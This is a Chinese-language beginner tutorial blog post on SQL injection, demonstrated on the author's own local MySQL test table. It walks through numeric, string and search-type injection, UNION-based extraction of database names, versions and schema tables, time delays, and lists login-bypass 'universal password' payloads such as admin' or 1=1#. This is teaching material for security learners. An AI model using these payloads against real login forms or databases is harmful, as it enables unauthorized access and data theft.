---
title: "SQL注入--基础篇"
categories: [ "安全技术" ]
tags: [ "渗透","SQL" ]
draft: false
slug: "356"
date: "2019-07-28 14:58:00"
---

# 起因

一直以来都准备做的渗透基础教程

在介绍完了基本的信息收集和渗透环境搭建篇之后算是正式开始

可能会做很久也不一定做完，但是一定会更新下去

** 声明：作者初衷用于分享与普及网络安全知识，若读者因此作出任何危害网络安全行为后果自负，与作者及本网站无关 **

# SQL 注入介绍

SQL 语句：SQL(Structured Query Language)，结构化的查询语言，是关系型数据库通讯的标准语言。

```
查询：SELECT statement FROM table WHERE condition
删除记录：DELETE FROM table WHERE condition
更新记录：UPDATE table SET field=value WHERE condtion
添加记录：INSERT INTO table field VALUES(values)
```

SQL 注入(SQL Injection):

> 是程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患，用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作

SQL 注入攻击流程：

1.判断注入点 2.判断注入点类型 3.判断数据库类型 4.获取数据库数据，提权

# SQL 注入原理分析

本篇教程应该是基于 shack2 大佬的 SQL 注入教程写的

记不太清楚了因为笔记创建时间是`19-03-01`:

![][1]

而且现在`shack2`大佬的[博客][2]已经关站，只留了一个[github 地址][3]

大佬的很多工具也是非常好用的，后面也会介绍到，本文中途有一些大佬有的环境我没有的

只能使用大佬的图片了但是肯定也是看得懂的

我这里使用本地的`Navicat for MySql`工具和`phpstudy`提供的`MySql`数据库来讲解

这两个工具在前面我都介绍过，分别为

- <<Navicat 家族产品安装及破解>>
- <<渗透练习环境搭建 (长期更新)>>

用`Navicat`工具连接上本地的`mysql`数据库之后新建一个数据库`test`

在`test`中新建一个表`new`:

![][4]

填入以下数据：

| id  | title           | content        | type |
| --- | --------------- | -------------- | ---- |
| 1   | 我是 SQL 注入   | 你知道吗？     | 1    |
| 2   | 我不是 SQL 注入 | 你还不知道吗？ | 2    |

然后用查询工具运行以下语句插入一行：

```
INSERT INTO test.new VALUES(3,'test','test',3)
```

![][5]

点击运行，刷新 new 表，发现数据已经被插进去了：

![][6]

来一个基础的查询：

![][7]

那我们要查找部分数据可以用 limit(x,y)来查询从第 x 条开始的 y 条数据

比如这里查询从第 0 条开始的 1 条数据（sqlserver 里面的关键字是用的 top）：

![][8]

![][9]

## 数字型注入

我们查询`id=1`：

![][10]

查询`id=1 AND 1=2`，没有数据：

![][11]

到这我们已经能判断有一个 SQL 注入了，如果没有过滤的话就可以盲注了，我们用`or 1=1`(永远为真)试一下：

![][12]

也可以这么理解：

```
SELECT * FROM test.new WHERE （id=1 OR 1=1）
```

我们试一下盲注，直接加一个`'`：

![][13]

打印出了 SQL 的报错信息，说明支持错误显示注入

我们用 Union 来试一下，直接`Union Select 1`：

![][14]

报错了，列不对，所以说我们用`order by`来判断列：

![][15]

`order by`加到 5 报错了(也可能是没数据)：

![][16]

说明这个表有 4 列数据，如果原查询语句是：

```
SELECT * FROM test.new WHERE id=1 AND 1=1 AND type='2'
```

这时候你再加个`ORDER BY`可能也没关系：

```
SELECT * FROM test.new WHERE id=1 ORDER BY 1 AND type='2'
```

![][17]

但是当有时候程序自身带了`ORDER BY`，比如原语句是：

```
SELECT * FROM test.new WHERE id=1 ORDER BY id DESC
```

这时候要在 1 这个位置上再插入一个`ORDER BY`进去：

```
SELECT * FROM test.new WHERE id=1 ORDER BY 1 ORDER BY id DESC
```

这条语句就会报错：

![][18]

这时候我们就可以用#注释掉后面的语句(有时候要考虑字符转码%23，因为在 URL 中#表示标记锚连接，直接定位到网页内位置的)：

```
SELECT * FROM test.new WHERE id=1 ORDER BY 1#23ORDER BY id DESC
```

![][19]

下面我们说一下怎样判断某个数据库存不存在，我们可以用`exists`函数：

```
SELECT * FROM test.new WHERE id=1 AND EXISTS(SELECT 1 FROM admin)
```

![][20]

返回正常说明`admin`这个表存在，`MYSQL`里面是自带`information_schema`这个库的

那我们看一下存不存在`information_schema.tables`就知道这个数据库是不是`MySQL`数据库了：

![][21]

返回正常，我们通过`Union SELECT`来看哪一个列能支持显示(这里使用的是大佬教程里的图片)：

![][22]

** 这里由于我使用的环境不好只显示部分位，实际很多靶场都是有多字段只显示部分字段的情况 **

这个图就明显说明第 2 列能被显示出来，但是如果只支持显示一个查询结果很有可能后面的结果我们看不见

我们可以把前面的加一个`AND 1=2`否定掉，这样就只会显示我们后面的一条数据了：

```
SELECT * FROM test.new WHERE id=1 AND 1=2 UNION SELECT 1,2,3,4231
```

![][23]

知道了显示位之后我们就可以在显示位上搞事情了，先来查询个数据库：

```
SELECT * FROM test.new WHERE id=1 AND 1=2 UNION SELECT 1,DATABASE(),3,4231
```

![][24]

再来查询个版本：

```
SELECT * FROM test.new WHERE id=1 AND 1=2 UNION SELECT 1,VERSION(),3,4231
```

![][25]

可以看到版本号为`5.5.53`，再来查询`information_schema`数据库的所有表名：

```
SELECT * FROM test.new WHERE id=1 AND 1=2 UNION SELECT 1,table_name,3,4231 FROM information_schema.tables
```

![][26]

延时函数直接 sleep(10)就行了：

![][27]

## 字符型注入

我们默认测试的地址为：

```
SELECT * FROM test.new WHERE type=2
```

![][28]

先来一个`AND 1=1`：

![][29]

再来个`1=2`：

![][30]

发现都没有输出，也没有报错，那怎么办呢？我们分析一下字符：原来的语句是：

```
SELECT * FROM test.new WHERE type='xxx'
```

现在我们要查询`type=2`的同时还要把`And 1=1`加进去：

```
SELECT * FROM test.new WHERE type='2' AND 1=1'
```

后面还有一个单引号，所以这里最适合的就是用字符型的把后面单引号闭合掉：

```
SELECT * FROM test.new WHERE type='2' AND '1'='1'
```

也就是我们的查询数据为：`2' AND '1'='1`，这样就把`2`查询了也把`AND 1=1`加进去了：

![][31]

其他的就和上面的数值型注入差不多了，比如`order by`：

```
SELECT * FROM test.new WHERE type='2' ORDER BY 1
```

![][32]

Union：

```
SELECT * FROM test.new WHERE type='2' UNION SELECT 1,2,3,4 FROM DUAL
```

![][33]

## 搜索型注入

一般语句是这样：

```
SELECT * FROM test.new WHERE title LIKE '%xxx%'
```

比如：

![][34]

那我们就可以用程序本身的%'把前面的闭合掉，然后再#注释掉后面的：

![][35]

![][36]

因为我们这里是 POST 方式提交的，不用编码，如果是 GET 方法提交的，这里需要先编码

![][37]

所以我们知道查询语句是'%xxx%'的情况下直接搜索%' and '%'='直接就闭合

## 万能密码

```
admin' or 'a'='a
admin' or 1=1#(mysql)
admin' or 1=1--(sqlserver)
admin' or 1=1;--(sqlserver)
```

其实就是闭合了的意思，为了介绍方便我在`test`数据库里再建一个`admin`表，数据如下：

| id  | username | passwd |
| --- | -------- | ------ |
| 7   | test     | test   |
| 8   | null     | null   |
| 9   | null     | null   |
| 10  | aaa      | xx     |
| 11  | aaa      | xx     |
| 12  |          |        |

![][38]

我们从这句经典登录来分析：

```
SELECT * FROM test.admin WHERE username='aaa' AND passwd='xx'
```

![][39]

当我们要在中间插入`or 'a' ='a'`的时候，也就是构成了这样的语句：

```
SELECT * FROM test.admin WHERE username='aaa' OR 'a'='a' AND passwd='xx'
```

![][40]

能查询成功，此时我们的输入的部分为：

```
aaa' OR 'a'='a
```

这样就能把`username`的前后两个’闭合，然后我们就能查询任意用户名的数据

查询出来的都是`password`为`xx`的账户的数据：

![][41]

但是这是在`password`是正确的前提下的，所以最好我们把它输成空：

![][42]

也可以用注释符：

```
SELECT * FROM test.admin WHERE username='xxx' OR 1=1#
```

![][43]

就能查询出所有数据，简而言之就是闭合前面的`username`并且保持为真

然后#注释掉后面的`password`就`OK`了，这就是万能密码`admin' or 'a'='a`的来源

所以在万能密码的条件下，只需要知道`username`我们就能去登录账户了

当万能密码用在`password`处的时候，语句是这样的：

```
SELECT * FROM test.admin WHERE username='adhajsdas' AND passwd='dhaisdhias' or 'a'='a'
```

![][44]

因为程序把前面的一部分看为一个整体了：

```
SELECT * FROM test.admin WHERE (username='adhajsdas' AND password='dhaisdhias') or ('a'='a')
```

所以这个永远是真，但是登录处肯定不会直接`SELECT *`的，但是也能得到它`SELECT`的所有结果。

基础原理讲的还是很枯燥的，后面会放一些例子及简单的记忆技巧，敬请期待！

本文完。

[1]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_155136.png
[2]: http://shack2.org/
[3]: https://github.com/shack2
[4]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_151559.png
[5]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152058.png
[6]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152136.png
[7]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152254.png
[8]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152356.png
[9]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152430.png
[10]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152628.png
[11]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152745.png
[12]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152824.png
[13]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_152956.png
[14]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_153102.png
[15]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_153214.png
[16]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_153252.png
[17]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_154033.png
[18]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_154125.png
[19]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_154159.png
[20]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_154712.png
[21]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_154752.png
[22]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_155438.png
[23]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_155751.png
[24]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_155849.png
[25]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_155941.png
[26]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_160040.png
[27]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_160515.png
[28]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161136.png
[29]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161157.png
[30]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161218.png
[31]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161256.png
[32]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161325.png
[33]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161348.png
[34]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161518.png
[35]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161552.png
[36]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161631.png
[37]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_161653.png
[38]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_162943.png
[39]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163100.png
[40]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163130.png
[41]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163716.png
[42]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163754.png
[43]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163204.png
[44]: https://img.soapffz.com/archives_img/2019/07/28/archives_20190728_163827.png